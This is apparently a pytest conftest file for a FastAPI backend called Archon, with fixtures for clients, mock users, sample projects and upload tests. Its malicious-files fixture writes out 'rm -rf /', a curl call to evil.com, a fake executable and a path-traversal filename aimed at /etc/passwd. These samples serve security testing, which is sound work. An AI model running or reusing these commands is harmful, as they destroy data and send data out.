"""
Test configuration and fixtures for the Archon backend tests.
"""
import pytest
import asyncio
import tempfile
import os
from pathlib import Path
from typing import AsyncGenerator, Generator
from fastapi.testclient import TestClient
from httpx import AsyncClient
import asyncpg

import sys
sys.path.append(str(Path(__file__).parent.parent))

from main import app
from app.auth import AuthorizedUser

TEST_DATABASE_URL = os.getenv("TEST_DATABASE_URL", "postgresql://localhost/archon_test")
TEST_USER_ID = "test_user_123"
TEST_USER_EMAIL = "test@example.com"

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture
def client() -> Generator[TestClient, None, None]:
    """Create a test client for the FastAPI application."""
    with TestClient(app) as test_client:
        yield test_client

@pytest.fixture
async def async_client() -> AsyncGenerator[AsyncClient, None]:
    """Create an async test client for the FastAPI application."""
    async with AsyncClient(app=app, base_url="http://test") as ac:
        yield ac

@pytest.fixture
def mock_user() -> AuthorizedUser:
    """Create a mock authorized user for testing."""
    return AuthorizedUser(
        sub=TEST_USER_ID,
        email=TEST_USER_EMAIL,
        display_name="Test User",
        profile_image_url=None
    )

@pytest.fixture
def temp_directory() -> Generator[Path, None, None]:
    """Create a temporary directory for test files."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)

@pytest.fixture
def sample_python_files(temp_directory: Path) -> dict:
    """Create sample Python files for testing."""
    files = {}
    
    main_py = temp_directory / "main.py"
    main_py.write_text("""
#!/usr/bin/env python3
\"\"\"
Sample Python application for testing.
\"\"\"

def hello_world():
    print("Hello, World!")

if __name__ == "__main__":
    hello_world()
""")
    files["main.py"] = main_py
    
    init_py = temp_directory / "__init__.py"
    init_py.write_text("# Package initialization")
    files["__init__.py"] = init_py
    
    requirements_txt = temp_directory / "requirements.txt"
    requirements_txt.write_text("""
fastapi==0.104.1
uvicorn==0.24.0
pytest==7.4.3
""")
    files["requirements.txt"] = requirements_txt
    
    setup_py = temp_directory / "setup.py"
    setup_py.write_text("""
from setuptools import setup, find_packages

setup(
    name="test-package",
    version="0.1.0",
    packages=find_packages(),
    install_requires=[
        "fastapi",
        "uvicorn",
    ],
)
""")
    files["setup.py"] = setup_py
    
    return files

@pytest.fixture
def sample_malicious_files(temp_directory: Path) -> dict:
    """Create sample malicious files for security testing."""
    files = {}
    
    malicious_py = temp_directory / "malicious.py"
    malicious_py.write_text("""
import os
import subprocess

# This is suspicious code
os.system("rm -rf /")
subprocess.call(["curl", "http://evil.com/steal"], shell=True)
""")
    files["malicious.py"] = malicious_py
    
    exe_file = temp_directory / "virus.exe"
    exe_file.write_bytes(b"MZ\x90\x00" + b"\x00" * 100)
    files["virus.exe"] = exe_file
    
    traversal_file = temp_directory / "..%2f..%2fetc%2fpasswd"
    traversal_file.write_text("root:x:0:0:root:/root:/bin/bash")
    files["traversal"] = traversal_file
    
    return files

@pytest.fixture
def large_files(temp_directory: Path) -> dict:
    """Create large files for size limit testing."""
    files = {}
    
    large_file = temp_directory / "large.py"
    large_content = "# " + "x" * (60 * 1024 * 1024)
    large_file.write_text(large_content)
    files["large.py"] = large_file
    
    return files

@pytest.fixture
async def test_db_connection():
    """Create a test database connection."""
    try:
        conn = await asyncpg.connect(TEST_DATABASE_URL)
        yield conn
    except Exception as e:
        pytest.skip(f"Test database not available: {e}")
    finally:
        if 'conn' in locals():
            await conn.close()

@pytest.fixture
def mock_github_repos():
    """Mock GitHub repository data for testing."""
    return [
        {
            "id": 1,
            "name": "test-python-repo",
            "full_name": "testuser/test-python-repo",
            "owner": {"login": "testuser"},
            "html_url": "https://github.com/testuser/test-python-repo",
            "description": "A test Python repository",
            "private": False,
            "language": "Python",
            "stargazers_count": 42,
            "updated_at": "2024-01-15T10:30:00Z"
        },
        {
            "id": 2,
            "name": "non-python-repo",
            "full_name": "testuser/non-python-repo",
            "owner": {"login": "testuser"},
            "html_url": "https://github.com/testuser/non-python-repo",
            "description": "A JavaScript repository",
            "private": False,
            "language": "JavaScript",
            "stargazers_count": 15,
            "updated_at": "2024-01-10T14:20:00Z"
        }
    ]

class TestFileUpload:
    """Utility class for creating test file uploads."""
    
    @staticmethod
    def create_upload_file(filename: str, content: bytes, content_type: str = "text/plain"):
        """Create a mock UploadFile for testing."""
        from fastapi import UploadFile
        from io import BytesIO
        
        file_obj = BytesIO(content)
        return UploadFile(
            filename=filename,
            file=file_obj,
            content_type=content_type
        )
    
    @staticmethod
    def create_form_data(files: list, project_name: str = None):
        """Create form data for file upload testing."""
        form_data = {}
        
        for i, file in enumerate(files):
            form_data[f"files"] = file
        
        if project_name:
            form_data["project_name"] = project_name
        
        return form_data

def override_get_current_user():
    """Override the authentication dependency for testing."""
    return AuthorizedUser(
        sub=TEST_USER_ID,
        email=TEST_USER_EMAIL,
        display_name="Test User",
        profile_image_url=None
    )

pytest.mark.unit = pytest.mark.unit
pytest.mark.integration = pytest.mark.integration
pytest.mark.security = pytest.mark.security
pytest.mark.slow = pytest.mark.slow
